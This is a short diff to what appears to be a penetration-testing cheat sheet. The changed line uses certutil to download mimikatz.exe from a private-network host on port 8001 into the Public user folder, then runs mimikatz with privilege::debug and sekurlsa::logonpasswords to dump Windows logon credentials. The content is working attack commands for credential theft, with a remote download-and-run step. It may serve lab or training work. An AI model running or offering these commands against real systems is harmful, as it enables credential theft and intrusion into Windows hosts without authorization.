@@ -1,7 +1,7 @@
 # Get
 Run mimikatz non-interactively:
 ```powershell
-.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+cd \Users\Public ; certutil.exe -urlcache -split -f "http://192.168.45.182:8001/mimikatz.exe"; .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
 ```
 
 ##### Forced authentication
